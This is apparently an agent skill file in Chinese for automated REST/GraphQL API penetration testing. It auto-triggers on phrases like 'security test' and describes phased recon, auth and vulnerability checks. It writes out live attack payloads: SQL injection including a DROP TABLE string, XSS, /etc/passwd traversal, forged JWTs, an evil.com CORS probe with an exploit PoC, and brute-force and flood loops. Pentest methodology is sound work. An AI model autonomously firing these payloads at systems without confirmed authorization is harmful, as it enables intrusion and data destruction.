---
name: api-security-testing
description: 针对授权目标进行结构化的 REST/GraphQL API 安全评估。当用户提到安全测试、漏洞检测、渗透测试或需要生成安全报告时自动触发。
trigger:
  # 触发短语
  phrases:
    - "安全测试"
    - "安全审计"
    - "渗透测试"
    - "漏洞检测"
    - "安全评估"
    - "api 安全"
    - "接口安全"
    - "rest api 安全"
    - "graphql 安全"
    - "swagger 安全"
    - "openapi 安全"
    - "帮我检测漏洞"
    - "检查安全问题"
    - "api 漏洞"
    - "安全报告"
    - "安全发现"
    - "全流程测试"
    - "完整测试"
  # 触发模式（正则）
  patterns:
    - "(?:帮我)?(?:进行?|做)(?:api|接口|rest|graphql|安全|渗透)?(?:测试|审计|检测|扫描|评估)"
    - "(?:帮我)?(?:检查?|发现?|识别?)(?:api|接口|rest|graphql|安全)?(?:漏洞|风险|问题)"
    - "(?:生成|输出)(?:api|安全)?报告"
    - "(?:rest|graphql|api)(?:端点|接口)(?:测试|安全)"
    - "(?:openapi|swagger)(?:规范|文件)(?:分析|审计|检测)"
  # 自动触发
  auto_trigger: true
---

# API 安全测试

针对授权目标进行结构化的 REST/GraphQL API 安全评估。

## 核心原则

1. **全流程覆盖**: 初始探测 → 资产发现 → 漏洞验证 → 报告生成
2. **自主决策**: Agent 根据发现自动选择下一步行动
3. **迭代深入**: 发现新线索时返回上一步深入探测
4. **工具联动**: 根据目标类型选择合适的探测工具

## 阶段决策引擎

### 阶段 0: 初始化 (自动执行)

**触发条件**: Skill 被激活后立即执行

**执行动作**:
```markdown
1. [ ] 检查目标可访问性
2. [ ] 识别前端技术栈
3. [ ] 识别 Web 服务器类型
4. [ ] 选择探测策略
```

**决策点**:
| 发现特征 | 选择策略 |
|---------|---------|
| Vue/React/Angular SPA | → 启用无头浏览器 + JS 分析 |
| 静态 HTML | → 目录扫描 + 指纹识别 |
| 直接返回 JSON | → API 指纹识别 |
| GraphQL | → GraphQL 专用探测 |

---

### 阶段 1: 目标探测与资产发现

**触发条件**: 阶段 0 完成后自动触发

**执行动作**:

#### 1.1 基础探测
```bash
# HTTP 头探测
curl -s -I http://target/

# 识别服务器类型
curl -s http://target/ | grep -iE "(server:|nginx|apache|tomcat)"
```

#### 1.2 SPA 检测与 JS 分析 (分支 A)
**触发条件**: 发现 HTML 返回 Vue/React 特征或 SPA 迹象

```bash
# 启用无头浏览器
npm install -g puppeteer

# 使用浏览器探测
node -e "
const puppeteer = require('puppeteer');
(async () => {
  const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
  const page = await browser.newPage();
  await page.goto('http://target/', { waitUntil: 'networkidle2' });
  
  // 捕获所有网络请求
  page.on('request', req => {
    if (req.url().includes('/api/') || req.url().includes('/prod-api/')) {
      console.log('[API] ' + req.method() + ' ' + req.url());
    }
  });
  
  // 提取 JS 文件
  const scripts = await page.evaluate(() => 
    Array.from(document.querySelectorAll('script[src]')).map(s => s.src)
  );
  console.log('Scripts:', scripts);
  
  await browser.close();
})();
"
```

#### 1.3 API 路径发现
```bash
# 常见 API 路径探测
curl -s http://target/api/ -H "Accept: application/json"
curl -s http://target/prod-api/ -H "Accept: application/json"
curl -s http://target/v1/api/ -H "Accept: application/json"
curl -s http://target/api/v1/ -H "Accept: application/json"

# 从 JS 文件提取 API 配置
curl -s http://target/static/js/app.*.js | grep -oE '(baseURL|base_url|apiUrl)[^;]{0,100}'
```

**迭代触发条件**:
- 发现 `baseURL: "/prod-api"` → 返回阶段 1.4 深入探测
- 发现 `/api/` 路径 → 返回阶段 1.4 端点枚举
- 发现 Swagger/OpenAPI → 进入阶段 2

#### 1.4 端点枚举
```bash
# 探测常见端点
for endpoint in /user /users /admin /login /auth /api /menu /role /system /config; do
  curl -s -I "http://target$endpoint" --max-time 5
done
```

---

### 阶段 2: 认证与授权测试

**触发条件**: 发现 API 端点后自动触发

**执行动作**:

#### 2.1 CORS 配置检测
```bash
# 测试 CORS 配置
curl -s -i "http://target/api/" -H "Origin: http://evil.com" | grep -iE "access-control"
```

**决策点**:
| CORS 响应 | 风险等级 | 行动 |
|-----------|---------|------|
| `Access-Control-Allow-Origin: *` | High | 记录配置问题 |
| `Access-Control-Allow-Origin: http://evil.com` + `allow-credentials: true` | **Critical** | 立即报告 CORS 漏洞 |
| 无 CORS 头 | Low | 继续其他测试 |

#### 2.2 登录接口测试
```bash
# 测试登录接口
curl -s "http://target/prod-api/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# 检查响应信息泄露
# 如果返回 "用户不存在" → 信息枚举漏洞
# 如果返回 "密码错误" → 信息枚举漏洞
# 如果返回统一消息 → 良好实践
```

#### 2.3 暴力攻击防护检测
```bash
# 连续发送多个请求测试速率限制
for i in {1..10}; do
  curl -s "http://target/prod-api/login" -X POST \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong"}'
done
# 检查是否有验证码或锁定机制
```

#### 2.4 认证端点发现
```bash
# 探测公开认证端点
curl -s "http://target/prod-api/captcha" -I
curl -s "http://target/prod-api/public/captcha" -I
curl -s "http://target/prod-api/auth/captcha" -I
curl -s "http://target/prod-api/ws/info"
curl -s "http://target/prod-api/license/valid"
```

**迭代触发条件**:
- 发现 `/ws/info` 公开访问 → 记录敏感端点泄露
- 发现 `/license/valid` 公开访问 → 记录配置泄露
- 发现 CORS 漏洞 → 直接进入阶段 4.1

---

### 阶段 3: 漏洞验证

**触发条件**: 阶段 2 完成或发现新资产后触发

**执行动作**:

#### 3.1 SQL 注入测试
```bash
# 参数测试
curl -s "http://target/api/user?id=1' OR '1'='1"
curl -s "http://target/api/user?id=1; DROP TABLE users--"

# Header SQL 注入
curl -s "http://target/api/list" -H "X-User-ID: 1' OR '1'='1"
```

#### 3.2 XSS 测试
```bash
curl -s "http://target/api/search?q=<script>alert(1)</script>"
```

#### 3.3 认证绕过测试
```bash
# 空 Token
curl -s "http://target/api/user/info" -H "Authorization: "

# 伪造 Token
curl -s "http://target/api/user/info" -H "Authorization: Bearer fake_token"

# JWT 绕过测试
curl -s "http://target/api/user/info" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
```

#### 3.4 路径遍历测试
```bash
curl -s "http://target/api/file?path=../../etc/passwd"
curl -s "http://target/api/download?file=/etc/passwd"
```

#### 3.5 信息泄露检测
```bash
# 错误信息泄露
curl -s "http://target/api/nonexistent"
curl -s "http://target/api/error"

# 调试端点
curl -s "http://target/api/debug"
curl -s "http://target/actuator"
curl -s "http://target/actuator/health"

# Swagger 暴露
curl -s "http://target/swagger-ui.html"
curl -s "http://target/v3/api-docs"
```

---

### 阶段 4: 深度测试 (可选)

**触发条件**: 基础测试完成后或时间允许

#### 4.1 CORS 漏洞利用验证
如果发现 CORS 配置错误，验证是否可以利用：
```javascript
// 构造恶意页面验证
const exploit = `
<html>
<body>
<script>
fetch('http://target/api/user/info', {
  credentials: 'include'
}).then(r => r.json()).then(console.log);
</script>
</body>
</html>
`;
console.log('CORS Exploit PoC:', exploit);
```

#### 4.2 WebSocket 安全测试
```bash
# 检查 WebSocket 升级
curl -s -i "http://target/api/ws/info"
# 测试 WS 连接
```

#### 4.3 业务逻辑测试
```bash
# 密码重置测试
curl -s "http://target/api/forget" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","email":"admin@test.com"}'

# 批量操作限制测试
for i in {1..100}; do
  curl -s "http://target/api/create" -X POST \
    -H "Content-Type: application/json" \
    -d '{"data":"test"}'
done
```

---

### 阶段 5: 报告生成

**触发条件**: 测试完成或用户确认结束

**自动执行**:
1. 汇总所有发现
2. 按严重性排序
3. 生成完整报告

---

## 决策树

```
开始测试
    ↓
阶段0: 初始化
    ↓
发现 Vue/React SPA? ─否→ 静态探测
    ↓是→ 启用无头浏览器
    ↓
阶段1: 资产发现
    ↓
发现 API 端点? ─否→ 继续探测
    ↓是↓
阶段2: 认证测试
    ↓
发现 CORS 漏洞? ─是→ 立即记录 → 继续测试
    ↓否
发现登录接口? ─是→ 测试暴力防护
    ↓否
阶段3: 漏洞验证
    ↓
SQLi → XSS → Auth Bypass → Path Traversal
    ↓
阶段5: 报告
```

---

## 工具选择指南

| 场景 | 推荐工具 | 用途 |
|------|---------|------|
| SPA 应用探测 | puppeteer | 动态加载 JS、捕获 API 调用 |
| 静态站点探测 | curl + grep | 快速指纹识别 |
| API 端点发现 | curl + ffuf | 路径爆破 |
| 认证测试 | burp suite / curl | 登录和会话测试 |
| 漏洞验证 | burp suite / sqlmap | 深度漏洞测试 |

---

## 严重性校准

### 严重性级别

| 级别 | 触发条件 | 示例 |
|------|----------|------|
| Critical | 直接导致未授权访问或账户劫持 | CORS + credentials、SQL注入 |
| High | 可导致权限提升或用户数据访问 | IDOR、垂直越权、敏感端点泄露 |
| Medium | 可导致有限影响或信息泄露 | 信息枚举、暴力防护缺失 |
| Low | 影响有限的信息披露 | 调试头暴露、版本信息泄露 |
| Informational | 非安全问题 | 最佳实践建议 |

### 置信度级别

| 级别 | 标准 | 要求证据 |
|------|------|----------|
| Confirmed | 完全验证，有 PoC | 完整请求/响应 |
| High | 强指标 | 请求+响应+影响分析 |
| Medium | 中等指标 | 观察到的行为 |
| Low | 弱指标 | 单一响应 |
| Hypothesis | 理论推断 | 需要进一步调查 |

---

## 输出格式

**完整模板参考**：`references/report-template.md`

### 必须包含的章节

```markdown
## Scope
- Target: [目标 URL]
- Assessment Mode: [文档驱动/被动/主动]
- Authorization: [授权范围]

## Asset Summary
- Base URLs:
- API Type: [REST/GraphQL/SPA+API]
- Tech Stack: [识别的技术栈]
- Auth Schemes: [认证方式]
- Discovered Endpoints: [端点列表]
- Sensitive Objects: [敏感对象]

## Test Matrix
| Category | Test Item | Priority | Status | Finding |
|----------|----------|----------|--------|---------|

## Findings
### Finding N: [标题]
**Severity**: [Critical/High/Medium/Low/Informational]
**Confidence**: [Confirmed/High/Medium/Low/Hypothesis]
**Affected Asset**: [endpoint]
**Description**: [问题描述]
**Evidence**: [请求/响应样本]
**Reproduction**: [复现步骤]
**Impact**: [影响评估]
**Remediation**: [修复建议]

## Coverage Gaps
| Gap | Impact | Recommendation |
|-----|--------|-----------------|

## Overall Risk Summary
| Risk Level | Count | Findings |
|------------|-------|----------|
```

---

## 参考文档

| 阶段 | 参考文档 |
|------|---------|
| 资产发现 | `references/asset-discovery.md` |
| 测试矩阵 | `references/test-matrix.md` |
| 输入验证 | `references/validation.md` |
| 严重性校准 | `references/severity-model.md` |
| REST API | `references/rest-guidance.md` |
| GraphQL | `references/graphql-guidance.md` |
| 报告模板 | `references/report-template.md` |
